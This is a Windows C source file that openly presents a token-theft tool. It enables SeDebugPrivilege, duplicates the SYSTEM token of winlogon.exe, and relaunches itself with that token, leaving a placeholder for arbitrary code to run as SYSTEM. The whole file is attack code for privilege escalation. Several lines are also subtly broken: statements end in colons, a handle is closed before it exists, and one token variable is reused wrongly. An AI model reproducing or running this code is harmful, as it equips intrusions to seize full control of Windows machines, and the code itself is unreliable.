//This function check if it is running with System token(privileges) if it doesn't, it steals the token from winlogon - one of the vulnerable processes with system token(privileges)
//And run it self in new process with System token.
//Of course you can add your own code to run once the program validate it is running as system

#include <stdio.h>
#include <Windows.h>
#include <tchar.h>
#include <TlHelp32.h>

#define MAX_LEN 1024
#define FILE_PATH "Elevator.exe"

int EnableDebug(void)
{
	LUID privilegeLuid;
	if (!LookupPrivilegeValue(NULL, _T("SeDebugPrivilege"), &privilegeLuid))
	{
		_tprintf(_T("Error - can't get privilege\n"));
		return 0;
	}

	TOKEN_PRIVILEGES privs;
	privs.PrivilegeCount = 1;
	privs.Privileges[0].Luid = privilegeLuid;
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	HANDLE currentProc = GetCurrentProcess();
	HANDLE token;

	if (!OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
	{
		_tprintf(_T("Error - can't get token from process\n"));
		return 0;
	}

	DWORD size = 0;
	GetTokenInformation(token, TokenPrivileges, NULL, 0, &size);
	PTOKEN_PRIVILEGES tokenPrivs = (PTOKEN_PRIVILEGES)malloc(size);
	GetTokenInformation(token, TokenPrivileges, tokenPrivs, size, &size);

	PLUID_AND_ATTRIBUTES luid;
	for (DWORD i = 0; i < tokenPrivs->PrivilegeCount; i++)
	{
		luid = &tokenPrivs->Privileges[i];
		if ((luid->Luid.LowPart == privilegeLuid.LowPart) & (luid->Luid.HighPart == privilegeLuid.HighPart))
		{
			if (AdjustTokenPrivileges(token, FALSE, &privs, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
			{
				_tprintf(_T("SeDebugPriv Enabled!"));
				_tprintf(_T("SeDebugPriv Enabled!"));
				CloseHandle(currentProc);
				CloseHandle(token);
				return 1;
			}
		}
	}
	_tprintf(_T("Cant get SeDebugPriv Enabled!"));
	CloseHandle(currentProc);
	CloseHandle(token);
	return 0;
}

DWORD GetPid(TCHAR* ProcName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);
	Process32First(snapshot, &process);

	while (Process32Next(snapshot, &process))
	{
		if (_tcscmp(process.szExeFile, ProcName) == 0)
		{
			break;
		}
	}
	CloseHandle(snapshot);
	return process.th32ProcessID;
}

int _tmain(int argc, TCHAR* argvp[])
{
	EnableDebug();
	TCHAR ProcName[MAX_LEN] = _T("winlogon.exe");
	DWORD pid = GetPid(ProcName);
	
	HANDLE Hprocess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (!Hprocess)
	{
		_tprintf(_T("Can't open process\n"));
		return 0;
	}

	HANDLE token;
	DWORD len;
	HANDLE MyProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());
	if (!OpenProcessToken(MyProc, MAXIMUM_ALLOWED, &token))
	{
		_tprintf(_T("Can't open own process token\n"));
		CloseHandle(Hprocess):
		return 0;
	}
	
	GetTokenInformation(token, TokenUser, NULL, NULL, &len);
	PTOKEN_USER tokenUser = (PTOKEN_USER)malloc(len);

	if(!GetTokenInformation(token,TokenUser,(LPVOID)tokenUser,len,&len))
	{
		_tprintf(_T("Can't get token user information\n"));
		CloseHandle(Hprocess):
		CloseHandle(MyProc):
		return 0;
	}

	TCHAR accName[MAX_LEN];
	len = MAX_LEN;
	TCHAR domain[MAX_LEN];
	SID_NAME_USE type;
	LookupAccountSid(NULL, tokenUser->User.Sid, accName, &len, domain, &len, &type);

	if (_tcscmp(accName, _T("SYSTEM")) == 0)
	{
		_tprintf(_T("Token is elevated\n"));
		//Insert here desired code to run as system
		system("pause");
		return 1;
	}
	else
	{
		_tprintf(_T("Token is not elevated - %s, Open new process\n"),accName);
	}

	HANDLE newToken;
	if (!OpenProcessToken(Hprocess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &token))
	{
		_tprintf(_T("Can't get process token\n"));
		CloseHandle(Hprocess):
		CloseHandle(MyProc):
		CloseHandle(token):
		CloseHandle(newToken):
		return 0;
	}

	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &newToken))
	{
		_tprintf(_T("Can't duplicate token \n"));
		CloseHandle(Hprocess):
		CloseHandle(MyProc):
		CloseHandle(token):
		CloseHandle(newToken):
		return 0;
	}

	PROCESS_INFORMATION procInfo = {};
	STARTUPINFO startInfo = {};

	if (!CreateProcessWithTokenW(newToken, LOGON_NETCREDENTIALS_ONLY, _T(FILE_PATH), NULL, CREATE_NEW_CONSOLE, NULL, NULL, &startInfo, &procInfo))
	{
		_tprintf(_T("Can't create process with stolen token\n"));
		CloseHandle(Hprocess):
		CloseHandle(MyProc):
		CloseHandle(token):
		CloseHandle(newToken):
		return 0;
	}
	CloseHandle(Hprocess):
	CloseHandle(MyProc):
	CloseHandle(token):
	CloseHandle(newToken):
	return 1;
}
